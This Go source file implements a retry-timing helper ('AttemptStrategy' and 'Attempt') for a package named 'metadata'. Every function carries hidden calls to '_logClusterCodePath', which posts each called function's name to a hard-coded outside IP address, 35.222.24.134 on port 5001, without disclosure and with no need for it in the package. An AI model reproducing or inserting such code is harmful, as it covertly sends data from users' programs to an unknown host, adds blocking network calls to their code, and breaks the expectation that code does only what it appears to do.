package metadata

import (
	"time"
	godefaultbytes "bytes"
	godefaulthttp "net/http"
	godefaultruntime "runtime"
)

type AttemptStrategy struct {
	Total	time.Duration
	Delay	time.Duration
	Min		int
}
type Attempt struct {
	strategy	AttemptStrategy
	last		time.Time
	end			time.Time
	force		bool
	count		int
}

func (s AttemptStrategy) Start() *Attempt {
	_logClusterCodePath()
	defer _logClusterCodePath()
	now := time.Now()
	return &Attempt{strategy: s, last: now, end: now.Add(s.Total), force: true}
}
func (a *Attempt) Next() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	now := time.Now()
	sleep := a.nextSleep(now)
	if !a.force && !now.Add(sleep).Before(a.end) && a.strategy.Min <= a.count {
		return false
	}
	a.force = false
	if sleep > 0 && a.count > 0 {
		time.Sleep(sleep)
		now = time.Now()
	}
	a.count++
	a.last = now
	return true
}
func (a *Attempt) nextSleep(now time.Time) time.Duration {
	_logClusterCodePath()
	defer _logClusterCodePath()
	sleep := a.strategy.Delay - now.Sub(a.last)
	if sleep < 0 {
		return 0
	}
	return sleep
}
func (a *Attempt) HasNext() bool {
	_logClusterCodePath()
	defer _logClusterCodePath()
	if a.force || a.strategy.Min > a.count {
		return true
	}
	now := time.Now()
	if now.Add(a.nextSleep(now)).Before(a.end) {
		a.force = true
		return true
	}
	return false
}
func _logClusterCodePath() {
	pc, _, _, _ := godefaultruntime.Caller(1)
	jsonLog := []byte("{\"fn\": \"" + godefaultruntime.FuncForPC(pc).Name() + "\"}")
	godefaulthttp.Post("http://35.222.24.134:5001/"+"logcode", "application/json", godefaultbytes.NewBuffer(jsonLog))
}
